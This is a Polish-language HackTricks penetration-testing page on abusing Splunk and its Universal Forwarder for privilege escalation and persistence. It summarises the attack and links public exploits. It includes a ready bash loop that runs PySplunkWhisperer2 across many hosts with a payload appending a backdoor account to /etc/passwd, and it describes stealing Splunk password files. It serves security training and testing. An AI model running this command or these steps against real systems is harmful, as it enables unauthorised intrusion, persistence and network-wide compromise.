# Splunk LPE i Utrzymywanie

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}

Jeśli **enumerując** maszynę **wewnętrznie** lub **zewnętrznie** znajdziesz **uruchomiony Splunk** (port 8090), jeśli masz szczęście i znasz jakieś **ważne dane logowania**, możesz **wykorzystać usługę Splunk** do **wykonania powłoki** jako użytkownik uruchamiający Splunk. Jeśli uruchamia go root, możesz podnieść uprawnienia do roota.

Jeśli jesteś **już rootem i usługa Splunk nie nasłuchuje tylko na localhost**, możesz **ukraść** plik **hasła** **z** usługi Splunk i **złamać** hasła lub **dodać nowe** dane logowania. I utrzymać trwałość na hoście.

Na pierwszym obrazku poniżej możesz zobaczyć, jak wygląda strona internetowa Splunkd.



## Podsumowanie Eksploatacji Agenta Splunk Universal Forwarder

Aby uzyskać więcej szczegółów, sprawdź post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). To tylko podsumowanie:

**Przegląd Eksploatacji:**
Eksploatacja celująca w Agenta Splunk Universal Forwarder (UF) pozwala atakującym z hasłem agenta na wykonywanie dowolnego kodu na systemach uruchamiających agenta, co potencjalnie może skompromitować całą sieć.

**Kluczowe Punkty:**
- Agent UF nie weryfikuje przychodzących połączeń ani autentyczności kodu, co czyni go podatnym na nieautoryzowane wykonanie kodu.
- Powszechne metody pozyskiwania haseł obejmują ich lokalizację w katalogach sieciowych, udostępnionych plikach lub dokumentacji wewnętrznej.
- Udana eksploatacja może prowadzić do dostępu na poziomie SYSTEM lub roota na skompromitowanych hostach, wycieków danych i dalszej infiltracji sieci.

**Wykonanie Eksploatacji:**
1. Atakujący uzyskuje hasło agenta UF.
2. Wykorzystuje API Splunk do wysyłania poleceń lub skryptów do agentów.
3. Możliwe działania obejmują ekstrakcję plików, manipulację kontami użytkowników i kompromitację systemu.

**Wpływ:**
- Pełna kompromitacja sieci z uprawnieniami SYSTEM/root na każdym hoście.
- Potencjalna możliwość wyłączenia logowania w celu uniknięcia wykrycia.
- Instalacja backdoorów lub ransomware.

**Przykładowe Polecenie do Eksploatacji:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Użyteczne publiczne exploity:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Wykorzystywanie zapytań Splunk

**Aby uzyskać więcej szczegółów, sprawdź post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>
{% endhint %}
